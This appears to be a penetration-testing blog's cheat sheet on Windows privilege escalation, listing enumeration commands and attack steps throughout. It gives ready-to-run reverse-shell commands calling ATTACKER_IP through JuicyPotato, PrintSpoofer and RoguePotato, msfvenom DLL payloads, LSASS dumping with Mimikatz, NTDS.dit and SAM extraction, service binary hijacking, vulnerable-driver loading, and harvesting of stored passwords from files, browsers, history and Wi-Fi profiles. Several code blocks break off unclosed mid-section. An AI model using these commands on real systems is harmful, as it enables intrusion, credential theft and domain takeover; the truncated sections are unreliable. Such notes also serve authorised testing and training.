# Windows Privilege Escalation

As with the Linux operating system, a misconfigured Windows machine can allow an attacker to gain ```Administrator``` or ```NT AUTHORITY\SYSTEM``` rights. While the ```Administrator``` is a user on any Windows machine, ```NT AUTHORITY\SYSTEM```, often called ```SYSTEM```, is an account that has the most rights but to which you cannot log in with credentials.

> For reading purpose, I won't tell if we are using a ```CMD``` console when running a command but will display a command that uses ```Powershell``` like ```PS> COMMAND```.
{: .prompt-danger }

## Network Information Gathering

### IPconfig

As for a Linux machine, we may want to check for the network of the machine. We can print information about its internet network with the command ```ipconfig``` :
```posh
ipconfig /all
```
This will allow us to know if there is more than one network interface which can be leveraged to access a computer on a sub-network.

### ARP

We can use the ```arp``` command to check for other computers on the network like this :

```posh
arp -a
```

### Routing Table

The routing table can show us what routes can packages take on the network :

```posh
route print
```

### Netstat

The ```netstat``` command can show us if there is any service running on the machine that may be leveraged :

```posh
netstat -ano
```

### Windows Defender & AppLocker Rules

To display information about ```Windows Defender``` or the ```AppLocker``` rules we can run the followinf commands :
```posh
PS > Get-MpComputerStatus
```
```posh
PS > Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

-------

## Basic Enumeration

It's important to have information about the computer we are attacking. Like on Linux, we can, for example, list the running processes with the ```tasklist``` command :

```posh
tasklist /svc
```

### System information

We can list environment variables with the ```set``` command. With the ```systeminfo``` we can get a lot of information about the computer we are in like the host name, the OS Version, the type of processor used...

To see if a machine is up to date, we can look to its ```hotfixes``` with the following command and by checking the Microsoft website:
```posh
wmic qfe
```
or
```posh
PS > Get-HotFix | ft -AutoSize
```

> You can search for a specific ```hotfix``` [here](https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808)
{: .prompt-tip }

We can look at the path variables like this :
```posh
PS > cmd /c echo %PATH%
```

#### Program installed

We can check for non-standard applications that may have been installed by a user or an administrator :

```posh
wmic product get name
```
or
```posh
PS > Get-WmiObject -Class Win32_Product |  select Name, Version
```

#### RPC

A user can connect to a machine with the RPC protocol. We can look if another user is connected on our machine with the ```query user``` command. If you want to know how to impersonate this user check [this part of my blog](https://nouman404.github.io/Notes/Footprinting/Common_Services_Enumeration_&_Attacks#rdp-session-hijacking).

### Current User Privileges

When we arrive on a machine we may want to know which user we are or what are our rights. To check our user we can use the ```whoami``` or the ```echo %USERNAME%``` command. To see which rights our user has we can run the command ```whoami /priv``` and if we are a classic user we may get this output.

```posh
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

> As you can see, we have some privileges that are disabled. You can enable them all using [this script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1) or [this one](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1). First enable the script ```Import-Module .\EnableAllTokenPrivs.ps1``` and then run it ```.\EnableAllTokenPrivs.ps1```.
{: .prompt-tip }

We may want to check which group we are in because we can inherit privileges from certain.

```posh
whoami /groups
```

We may also want to look for other users with the ```net user``` command or the list of all groups with this ```net localgroup``` command. To get information about a certain group you can use ```net localgroup GROUP_TO_CHECK```.

-------

## Exploit User Rights

### SeImpersonate & SeAssignPrimaryToken

Every process in Windows has a token that contains details about the account that is operating it. Since these tokens are merely memory addresses that can be brute-forced by users who are unable to access memory, they are not thought of as secure resources. The ```SeImpersonate``` privilege is required to use the token. Only administrator accounts are granted access to it, and in most circumstances, it can be taken away during system hardening.

We are going to use [JuicyPotato](https://github.com/ohpe/juicy-potato) that can be used to exploit the ```SeImpersonate``` or ```SeAssignPrimaryToken``` privileges via DCOM/NTLM reflection abuse. Start a netcat listener on your attacker machine and then launch this command :

```posh
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe ATTACKER_IP ATTACKER_PORT -e cmd" -t *
```

> You may get issues if you don't put the full path of a file.
{: .prompt-tip }

> Note that we are using a ```cmd``` reverse shell but we can of course use ```powershell``` instead.
{: .prompt-info }

> If you are not running the exploit from a running process like an SQL server. You may need to add the ```-c``` flag. Then add a value, depending on the machine you are on, from [here](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md). If the first value doesn't work try the second, then the third... until it works.
{: .prompt-warning }

Where [JuicyPotato](https://github.com/ohpe/juicy-potato) doesn't work ```Windows Server 2019``` and ```Windows 10 build 1809``` onwards, [RoguePotato](https://github.com/antonioCoco/RoguePotato) and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) do work.

```posh
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe  ATTACKER_IP ATTACKER_PORT -e cmd"
```

or

```posh
c:\tools\RoguePotato.exe -r ATTACKER_IP -e "c:\tools\nc.exe  ATTACKER_IP ATTACKER_PORT -e cmd" -l LISTENING_PORT
```

> Note that we are using a ```cmd``` reverse shell but we can of course use ```powershell``` instead.
{: .prompt-info }

### SeDebugPrivilege

Instead of adding the account to the administrators group, a user may be given the ```SeDebugPrivilege``` to run a specific program or service or help with troubleshooting. To leverage this privilege we can dump process memory. The ```Local Security Authority Subsystem Service``` (LSASS) process is a good target. We can do it with the GUI or with the command line. With the GUI, you will need to launch the ```Task Manager```, go to the ```Details``` section and find the ```lsass.exe``` process. When found, you can right click on it and select ```Create dump file```. The command for the command line is :

```posh
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

> ```procdump.exe``` may not be installed by default but you can install it from the [Windows website](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)
{: .prompt-info}

Now that we have the lsass dump (```lsass.dmp```), we can run [Mimikatz](https://www.kali.org/tools/mimikatz/) (you can also use the [github repo](https://github.com/ParrotSec/mimikatz)).

```posh
mimikatz.exe
```

When on Mimikatz, we will try to dump password hashes :

```posh
mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords

<SNIP>
```


### SeTakeOwnershipPrivilege


The ```SeTakeOwnershipPrivilege``` policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.

First we can check who has the ownership of the file we are targeting :

```posh
PS > Get-ChildItem -Path 'C:\Users\bob\Desktop\Secret_Data.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

If there is no name on the ```Owner``` section, you can look a the owner of the directory where the file is located with the ```dir /q``` command. Now we can take the ownership :

```posh
PS > takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

If we still can't read the file, we can use the ```icacls``` command to change its Access Control Lists (ACL) :

```posh
icacls 'C:\Users\bob\Desktop\Secret_Data.txt' /grant OUR_USER:F
```

This command will grant us full access (```F```) to the file.

---

## Exploit Groups Permissions

Just like the user privileges, groups allow you to do things that a normal user may not be able to do. To see in which group we are in you can use the command ```whoami /groups```.

### Backup Operators

When member of this group, we are granted the ```SeBackup``` and ```SeRestore``` rights. ```SeBackupPrivilege``` allows file content retrieval, even if the security descriptor on the file might not grant such access. A caller with ```SeBackupPrivilege``` enabled obviates the need for any ACL-based security check.

Because we can't use the standard ```copy``` command, we can use a program to copy files or just use the following [PoC](https://github.com/giuliano108/SeBackupPrivilege). As the Github states, we need to import the two ```dll``` in ```Powershell``` :

```posh
PS > Import-Module .\SeBackupPrivilegeUtils.dll
PS > Import-Module .\SeBackupPrivilegeCmdLets.dll
```
To check if the ```SeBackupPrivilege``` is enabled, we can use either the ```whoami /priv``` or the ```PS > Get-SeBackupPrivilege``` command. If the privilege isn't enabled, we can use the following command to enable it :

```posh
PS > Set-SeBackupPrivilege
```

Imagine that we can't read the content of the ```Secret_Data.txt``` on the bob desktop. We can use this command to copy it to a location where we have read rights.

```posh
PS > Copy-FileSeBackupPrivilege 'C:\Users\bob\Desktop\Secret_Data.txt' .\Secret_Data.txt
```

#### Attacking Domain Controler (NTDS.dit)

This group also permits local domain controller logins. Given that it stores the NTLM hashes for all user and computer objects in the domain, the active directory database ```NTDS.dit``` makes for an extremely appealing target. However, unprivileged users cannot access this file since it is locked.

The [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) command allows us to create a shadow copy of the ```C:``` drive.

```posh
PS > diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

Now if you try to list the directories of the ```E:``` drive, you will see the same tree structure as in the ```C:``` drive.
The ```Copy-FileSeBackupPrivilege``` cmdlet allows us to bypass ACL and copy the NTDS.dit wherever we want :

```posh
PS > Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Users\Public\Downloads\ntds.dit
```

> You also use tools to extract the ```ntds.dit``` file like robocopy :  ```robocopy /B E:\Windows\NTDS .\ntds ntds.dit```
{: .prompt-tip }

We can now export ```SAM``` and ```SYSTEM``` registery hives and try to crack local user passwords. First we need to export these hives :

```posh
reg save HKLM\SYSTEM SYSTEM.SAV
```
```posh
reg save HKLM\SAM SAM.SAV
```
Now that we have the ```SAM``` and ```SYSTEM``` registery hives, we can extract all AD account credentials using tools such as ```secretsdump.py``` or the PowerShell [DSInternals](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Src/DSInternals.PowerShell/DSInternals.psd1) :

1. **DSInternals**

```posh
PS > Import-Module .\DSInternals.psd1
PS > $key = Get-BootKey -SystemHivePath .\SYSTEM
PS > Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
<CREDS>
```

2. **Secretsdump**

```sh
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

{: .prompt-info }

{: .prompt-tip }

### Event Log Readers

Members of this group can read event logs from local computers. The group is created when the server is promoted to a domain controller. You can try finding commands ran with credentials using either the CMD or Powershell :

```posh
wevtutil qe Security /rd:true /f:text | findstr "/user"
```

```posh
PS > wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

or 

```posh
PS > Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

### DnsAdmins

Members of ```DnsAdmins``` group have access to network DNS information. The default permissions are as follows: Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions. This group exists only if the DNS server role is or was once installed on a domain controller in the domain. Membership in this group may be used to increase privileges on a Domain Controller or in cases where a different server is serving as the domain's DNS server because the DNS service is run as ```NT AUTHORITY\SYSTEM```.

#### Leveraging DnsAdmins Access

First we will create a malicious dll file to add your user to the ```domain admins``` or to create a reverse shell on our attacker Linux machine :

```sh
msfvenom -p windows/x64/exec cmd='net group "domain admins" USER /add /domain' -f dll -o adduser.dll
```

or

```sh
msfvenom -p windows/shell/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f dll -o shell-cmd.dll
```

Now that our ```.dll``` malicious file is created you can upload it to the Windows machines using the method of your choice (HTTP, SMB, FTP server...).
If you start a HTTP server you can download the file on windows using the following command :

```posh
wget "http://IP:PORT/YOUR_MALICIOUS_FILE.dll" -outfile "YOUR_MALICIOUS_FILE.dll"
```

If you are not a member of the ```DnsAdmins``` group you may get an error when trying to execute your malicious dll.

```posh
dnscmd.exe /config /serverlevelplugindll C:\Users\Public\Downloads\YOUR_MALICIOUS_FILE.dll
```

> You can check if you are a member of the ```DnsAdmins``` group with the command : ```Get-ADGroupMember -Identity DnsAdmins```.
{: .prompt-tip }

> We must specify the full path to our malicious DLL or the attack will not work properly.
{: .prompt-warning }

To receive our reverse shell or to add our user to a certain group we need to stop the DNS service and start it back :

```posh
sc stop dns
```
```posh
sc start dns
```

You can also use the ```mimilib.dll``` (by the creator of Mimikatz) explained in [this blog](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) to abuse the ```dns admin group``` privileges.

### Creating a WPAD Record

Clients can utilize the Web Proxy Auto-Discovery (WPAD) Protocol to find the URL of a configuration file using DHCP and/or DNS discovery techniques. The configuration file can be invoked to find the proxy for a given URL after detection and download are finished.

For this attack to work, we first need to disable the Global Query Block List :

```posh
PS > Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.DOMAIN_NAME.local
```

We can now add our attacker machine to the WPAD Records :

```posh
PS > Add-DnsServerResourceRecordA -Name wpad -ZoneName DOMAIN.local -ComputerName dc01.DOMAIN.local -IPv4Address OUR_ATTACKER_IP
```

### Print Operators

Members of this group can manage, create, share, and delete printers that are connected to domain controllers in the domain. They can also manage Active Directory printer objects in the domain. Members of this group can locally sign in to and shut down domain controllers in the domain. This grant their user the ```SeLoadDriverPrivilege``` privilege.

First we can use the [EnableSeLoadDriverPrivilege](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp) tool to enable the privilege and load the driver. You can add the following includes at the begining of the file :

```c
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

You can compile the ```.cpp``` file in Visual Studio using the following command : ```cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp```.
Now you have to upload this [Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys) file and add a reference to this driver under our HKEY_CURRENT_USER tree :

```posh
reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Users\Public\Downloads\Capcom.sys"
```
```posh
reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1
```

We can use the [DriverView.exe](https://www.nirsoft.net/utils/driverview.html) tool to see if the ```Capcom.sys``` driver is loaded or not.

```posh
PS > .\DriverView.exe /stext drivers.txt
```
```posh
PS > cat drivers.txt | Select-String -pattern Capcom
```

If the second command doesn't give you any output, it means that the driver is not loaded. You can run the program that you have compiled earlier :

```posh
EnableSeLoadDriverPrivilege.exe
```

If you run the previous commands, you will now see that the ```Capcom.sys``` driver is now loaded.
You can now use [this PoC](https://github.com/tandasat/ExploitCapcom) to exploit the ```Capcom.sys```.
 
> If you don't have a GUI connection to the windows machine, you may not be able to execute the previous exploit. You can modify it by replacing the call of the ```cmd.exe``` in the ```LaunchShell``` by a call to a reverse shell executable that you created before compiling ```ExploitCapcom.cpp```. The line should look like ```TCHAR CommandLine[] = TEXT("C:\\ProgramData\\MyReverseShell.exe");```.
{: .prompt-danger }

You can automate all this process with [this exploit](https://github.com/TarlogicSecurity/EoPLoadDriver/) and then run the ```ExploitCapcom.exe``` to pop us a ```SYSTEM``` shell :

```posh
EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Users\Public\Downloads\Capcom.sys
```

### Server Operators

Members in the ```Server Operators``` group can administer domain controllers. This group exists only on domain controllers. By default, the group has no members. Members of the ```Server Operators``` group can perform the following: sign in to a server interactively, create and delete network shared resources, start and stop services, back up and restore files, format the hard disk drive of the computer, and shut down the computer. This group cannot be renamed, deleted, or moved. Membership of this group confers the powerful ```SeBackupPrivilege``` and ```SeRestorePrivilege``` privileges and the ability to control local services.

We need to find a service that start as ```SYSTEM```. We can do it by using the ```sc qc SERVICE_NAME``` command or the [PsService](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) as follows :

```posh
PsService.exe security SERVICE_NAME
```

If the ```Server Operators``` group has privileges over this service we should see something like : 

```console
[ALLOW] BUILTIN\Server Operators
                All
```
Now that we know which service to exploit, we can change its binary path to execute a command like a reverse shell or adding our user to a certain group :

```posh
sc config SERVICE_NAME binPath= "cmd /c net localgroup Administrators OUR_USER /add"
```

We will get an error when starting the service because of the previous command. But when the error is prompted check your listener or in which group you are in. You should see that the previous command worked :

```posh
sc start SERVICE_NAME
```

> If the service is already running, you can stop it with the ```sc stop SERVICE_NAME``` command.
{: .prompt-tip }

> Now that we have complete access to the domain controller, we can use crackmapexec to dump admin credentials, for example.
{: .prompt-tip }

---

## OS Attacks

### Checking Weak ACL

  We can check if there are binaries with weak ACL permission with the [SharpUp](https://github.com/GhostPack/SharpUp/) executable :

```posh
PS > .\SharpUp.exe audit
```

With the result gathered with the ```SharpUp``` command, we can sharpen our results with the ```icalcs``` command :

```posh
PS > icacls "C:\PATH\TO\THE\FILE.exe"
```

When you find a vulnerable service you can replace the executable by your own (shell, reverse shell, add your user to admin group...) and then launch the service :

```posh
sc start SERVICE_NAME
```

> Don't forget to make a copy of the executable you are replacing not to break the environment and get back to the initial state after your assessment.
{: .prompt-tip }

You can also use the [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) command to check for file permissions of the service :

```posh
accesschk.exe /accepteula SERVICE_NAME
```

If you have enough rights, you can change the path of the binary as in the [Server Operators](/Notes/Privilege_Escalation/Windows_PE#server-operators) section.

### Unquoted Service Path

The registry configuration establishes a path to the binary that must be run when a service is started after it is installed. Windows will make an attempt to locate this binary in several locations if it is not enclosed in quotes.

You can search for unquote service path manualy withe the ```sc qc SERVICE_NAME``` or automatically with the command :

```posh
wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

If we find a service which has the path ```C:\Program Files (x86)\My Service\MyService.exe```, then, Windows will try to locate ```C:\Program.exe``` or ```C:\Program Files (x86)\My.exe``` because the path isn't between quotes. So if we have enough rights to put a malicious executable in those places, we could hijack the service.

### Kernel Exploit

Most of the Windows kernel exploit have their own CVE and PoC so I'm not going to go in depth with them but here is a list of some of them :
- [MS16-032](https://www.exploit-db.com/exploits/39574)
- [MS16-135](https://www.exploit-db.com/exploits/40823)
- [MS17-010](https://www.exploit-db.com/exploits/41891)
- [CVE-2017-0213](https://github.com/eonrickity/CVE-2017-0213)
- [Hot Potato](https://pentestlab.blog/2017/04/13/hot-potato/)
- [SmashedPotato](https://github.com/Cn33liz/SmashedPotato)

## Credential Theft

Once we arrive on a machine, we may want to look for credentials. Either they are still in some history or in some files. Some people put their password in some file in clear-text and we can find those by searching the keyword ```password``` :

```posh
PS > findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

> The ```/M``` option in ```/SIM``` can be removed to print the content of the file. The above command will only display file names.
{: .prompt-info}

> The ```/i``` or ```/p``` flags can be added to respectively ignores the case of the characters when searching for the string and skip files with non-printable characters. For more information about ```findstr``` flags, you can check its [manual](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr)
{: .prompt-tip}

### File Extensions

You can look for interesting file based on their name and/or their extension. Here are some example on how to do so :

```posh
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
```

```posh
where /R C:\ *.config
```

```posh
PS > Get-ChildItem C:\ -Recurse -Include *.rdp, *.config, *.vnc, *.cred -ErrorAction Ignore
```

### Sticky Notes Passwords

Sticky Notes is a basic Windows app that allows you to take notes and save them on your computer. Those notes are saved as information in a database and are located in :
```console
C:\Users\USERNAME\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

We can copy all ```plum.sqlite*``` files down to our system and open them with a tool such as [DB Browser for SQLite](https://sqlitebrowser.org/dl/) and view the Text column in the Note table with the query : 

```sql
SELECT Text FROM Note;
```

This can also be done with PowerShell using the [PSSQLite](https://github.com/RamblingCookieMonster/PSSQLite) module :

```posh
PS > Set-ExecutionPolicy Bypass -Scope Process

### Chrome Dictionary Files

We also can find clear-text passwords in Google dictionary files. Sensitive information, such as passwords, may be submitted via a browser-based application or email client, which highlights any terms it doesn't understand. In order to eliminate the annoying red underlining, the user may add these words to their dictionary.

```posh
PS > gc 'C:\Users\Bob\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

### Unattended Installation Files

Auto-logon settings or additional accounts that will be established as part of the installation may be defined via unattended installation files. The ```unattend.xml``` file stores passwords either in plaintext or base64-encoded form.

### PowerShell History File

In Powershell 5.0 and higer, its history is stored in this file : 
```console
C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

We can confirm that this is the real path using Powershell :

```posh
PS > (Get-PSReadLineOption).HistorySavePath
```

To read the content of this history file, we can use ```type FILE_TO_READ``` or the ```gc``` command :

```posh
PS > gc (Get-PSReadLineOption).HistorySavePath
```

To list history of all users that we have access as our current one, we can use this one-liner :

```posh
PS > foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

### Saved Credentilas

We can list users that have saved their credentials using the command ```cmdkey /list```. Now that we know which user have saved their credentials, we can run command as them :

```posh
PS > runas /savecred /user:DOMAIN\USER "COMMAND HERE"
```

### Browser Credentials

To retreive browser saved credentials, we can use tools such as [SharpChrome](https://github.com/GhostPack/SharpDPAPI) :

```posh
PS > .\SharpChrome.exe logins /unprotect
```

### Automated Tools

#### LaZagne
The [LaZagne](https://github.com/AlessandroZ/LaZagne) project is an open source application used to retrieve lots of passwords stored on a local computer. Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). This tool has been developed for the purpose of finding these passwords for the most commonly-used software.

```posh
PS > .\lazagne.exe all
```

#### Email

Using the program [MailSniper](https://github.com/dafthack/MailSniper), if we are able to log into a domain-joined system as a domain user with a Microsoft Exchange mailbox, we can try to search the user's email for words like "pass," "creds," "credentials," etc.

#### SessionGopher

To extract saved ```WinSCP```, ```FileZilla```, ```SuperPuTTY```, ```PuTTY```, and ```RDP``` credentials, we can use [SessionGopher](https://github.com/Arvanaghi/SessionGopher). The PowerShell-written utility looks for and decrypts remote access tool saved login credentials. It can be executed remotely or locally. It looks up and decrypts any session data it can find by searching the ```HKEY USERS``` hive for all users who have logged into a domain-joined (or standalone) host. Additionally, it may be used to search disks for ```RSA``` (.sdtid), ```Remote Desktop``` (.rdp), and ```PuTTY private key``` files (.ppk).

```posh
PS > .\SessionGopher.ps1
 
PS > Invoke-SessionGopher -Target MACHINE_NAME
 
          o_
         /  ".   SessionGopher

### Wifi Passwords

We can use the ```netsh``` command to show us password of Wifi networks we already connected to. We can first list recent Wi-Fi connections :

```posh
netsh wlan show profile
```

And then, we can list the password for a specific Wi-Fi :

```posh
netsh wlan show profile WIFI_NAME key=clear
```

## Mount VHDX/VMDK

Tools such as [Snaffler](https://github.com/SnaffCon/Snaffler) can show us some interesting files such as ```.vhd```, ```.vhdx```, and ```.vmdk``` files. These are ```Virtual Hard Disk```, ```Virtual Hard Disk v2``` (both used by Hyper-V), and ```Virtual Machine Disk``` (used by VMware). These three files can be mounted on either our local Linux attack machine or Windows attack machine if we come across any of them. The next commands allow us to mount a share from our Linux attack box or copy across one of these files, allowing us to browse the various operating system files and folders as if we were logged in.

```sh
guestmount -a FILE_NAME.vmdk -i --ro /mnt/vmdk
```

or

```sh
guestmount --add  FILE_NAME.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

On our Windows machine we can simply ```right-click``` on the file we want to mount and click on the ```Mount``` option.
